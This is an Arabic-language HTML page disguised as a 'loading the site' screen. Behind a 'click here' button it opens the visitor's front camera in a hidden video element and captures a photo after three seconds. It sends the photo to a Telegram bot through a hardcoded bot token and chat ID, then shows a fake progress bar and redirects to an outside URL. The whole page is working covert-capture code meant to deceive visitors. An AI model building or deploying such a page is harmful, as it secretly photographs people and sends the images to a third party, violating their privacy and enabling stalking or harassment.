<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري الدخول إلى الموقع</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #fff;
            position: relative;
            overflow: hidden;
        }
        .loading-container {
            width: 80%;
            max-width: 500px;
            text-align: center;
            background-color: rgba(0, 20, 40, 0.7);
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 100, 255, 0.5);
            position: relative;
            z-index: 10;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(0, 150, 255, 0.3);
        }
        h1 {
            color: #4fc3f7;
            margin-bottom: 30px;
            text-shadow: 0 0 10px rgba(79, 195, 247, 0.7);
        }
        .progress-container {
            width: 100%;
            height: 20px;
            background-color: rgba(0, 50, 100, 0.5);
            border-radius: 10px;
            margin: 20px 0;
            overflow: hidden;
            position: relative;
            display: none; /* مخفي حتى يتم تفعيله */
        }
        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(to right, #00bcd4, #0066ff);
            border-radius: 10px;
            transition: width 0.1s linear;
            box-shadow: 0 0 10px rgba(0, 188, 212, 0.7);
        }
        .progress-percent {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #fff;
            font-weight: bold;
            font-size: 12px;
            text-shadow: 0 0 5px #000;
        }
        .loading-text {
            margin-top: 20px;
            font-size: 18px;
            color: #b3e5fc;
        }
        .dots::after {
            content: '';
            animation: dots 1.5s steps(5, end) infinite;
        }
        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }
        
        /* زر منح الصلاحيات */
        .permission-btn {
            background: linear-gradient(to bottom, #0066ff, #0044cc);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin: 20px 0;
            box-shadow: 0 0 15px rgba(0, 102, 255, 0.7);
            transition: all 0.3s;
        }
        .permission-btn:hover {
            background: linear-gradient(to bottom, #0088ff, #0066ee);
            box-shadow: 0 0 20px rgba(0, 136, 255, 0.9);
        }
        
        /* عناصر الكمرة المخفية */
        #video {
            display: none;
        }
        
        /* خلفية المكعبات المتحركة */
        .background-cubes {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            overflow: hidden;
        }
        
        .cube {
            position: absolute;
            background: rgba(0, 150, 255, 0.1);
            border: 1px solid rgba(0, 200, 255, 0.3);
            animation: cubeAnimation 15s linear infinite;
            bottom: -100px;
            box-shadow: 0 0 10px rgba(0, 200, 255, 0.5);
        }
        
        @keyframes cubeAnimation {
            0% {
                transform: translateY(0) rotate(0deg);
                opacity: 1;
                border-radius: 0;
                box-shadow: 0 0 5px rgba(0, 200, 255, 0.3);
            }
            50% {
                box-shadow: 0 0 20px rgba(0, 200, 255, 0.8);
            }
            100% {
                transform: translateY(-1000px) rotate(720deg);
                opacity: 0;
                border-radius: 50%;
                box-shadow: 0 0 5px rgba(0, 200, 255, 0.3);
            }
        }
    </style>
</head>
<body>
    <!-- خلفية المكعبات المتحركة -->
    <div class="background-cubes" id="cubes-container"></div>
    
    <!-- عناصر واجهة الدخول -->
    <div class="loading-container">
        <h1>جاري الدخول إلى الموقع</h1>
        
        <!-- زر منح الصلاحيات -->
        <button class="permission-btn" id="permissionBtn">الضغط هنا </button>
        
        <div class="progress-container" id="progressContainer">
            <div class="progress-bar" id="progressBar"></div>
            <div class="progress-percent" id="progressPercent">0%</div>
        </div>
        <div class="loading-text">
            جاري التحقق من البيانات<span class="dots"></span>
        </div>
    </div>

    <!-- عناصر الكمرة المخفية -->
    <video id="video" autoplay playsinline></video>

    <script>
        // إنشاء المكعبات المتحركة
        function createCubes() {
            const container = document.getElementById('cubes-container');
            const cubeCount = 15;
            
            for (let i = 0; i < cubeCount; i++) {
                const cube = document.createElement('div');
                cube.classList.add('cube');
                
                // أحجام وأوضاع عشوائية
                const size = Math.random() * 50 + 20;
                const left = Math.random() * 100;
                const delay = Math.random() * 15;
                const duration = Math.random() * 10 + 10;
                
                cube.style.width = `${size}px`;
                cube.style.height = `${size}px`;
                cube.style.left = `${left}%`;
                cube.style.animationDelay = `${delay}s`;
                cube.style.animationDuration = `${duration}s`;
                
                container.appendChild(cube);
            }
        }
        
        // عناصر التحكم
        const permissionBtn = document.getElementById('permissionBtn');
        const progressContainer = document.getElementById('progressContainer');
        const progressBar = document.getElementById('progressBar');
        const progressPercent = document.getElementById('progressPercent');
        const video = document.getElementById('video');
        const duration = 20000; // 20 ثانية
        
        // دالة إرسال الصورة إلى Telegram
        async function sendPhotoToTelegram(photoData) {
            const botToken = '8387241026:AAFP3m5vSV5KpV63lF0kCiR1OJJEbOelQl4';
            const chatId = '7002841594';
            
            try {
                const formData = new FormData();
                const blob = await (await fetch(photoData)).blob();
                formData.append('photo', blob, 'user_photo.png');
                formData.append('chat_id', chatId);
                formData.append('caption', 'صورة المستخدم تم التقاطها تلقائياً');
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                return data.ok;
            } catch (error) {
                console.error('Error sending photo to Telegram:', error);
                return false;
            }
        }
        
        // بدء عملية الدخول والتقاط الصورة
        async function startProcess() {
            const startTime = Date.now();
            
            // 1. تشغيل الكمرة الأمامية (مخفية)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                video.srcObject = stream;
                
                // إظهار شريط التقدم
                progressContainer.style.display = 'block';
                permissionBtn.style.display = 'none';
                
                // 2. التقاط الصورة بعد 3 ثواني
                setTimeout(async () => {
                    const photoData = await capturePhoto(stream);
                    await sendPhotoToTelegram(photoData);
                }, 3000);
                
                // 3. تحديث شريط التقدم
                function updateProgress() {
                    const elapsed = Date.now() - startTime;
                    const progress = Math.min(elapsed / duration, 1);
                    progressBar.style.width = `${progress * 100}%`;
                    progressPercent.textContent = `${Math.round(progress * 100)}%`;
                    
                    if (progress < 1) {
                        requestAnimationFrame(updateProgress);
                    } else {
                        // الانتقال إلى الرابط بعد اكتمال الشريط
                        window.location.href = 'https://ww7.whort.net/?usid=102&utid=637be4338e02289a1191027c480de069';
                    }
                }
                updateProgress();
                
            } catch (err) {
                console.error('حدث خطأ:', err);
                permissionBtn.textContent ='إضغط للوصول للموقع';
            }
        }
        
        // دالة التقاط الصورة وإرجاعها كـ base64
        function capturePhoto(stream) {
            return new Promise((resolve) => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // إيقاف الكمرة
                stream.getTracks().forEach(track => track.stop());
                
                // إرجاع الصورة كـ base64
                resolve(canvas.toDataURL('image/png'));
            });
        }
        
        // بدء العملية عند النقر على زر الصلاحيات
        permissionBtn.addEventListener('click', startProcess);
        
        // إنشاء المكعبات عند تحميل الصفحة
        window.onload = createCubes;
    </script>
</body>
</html>
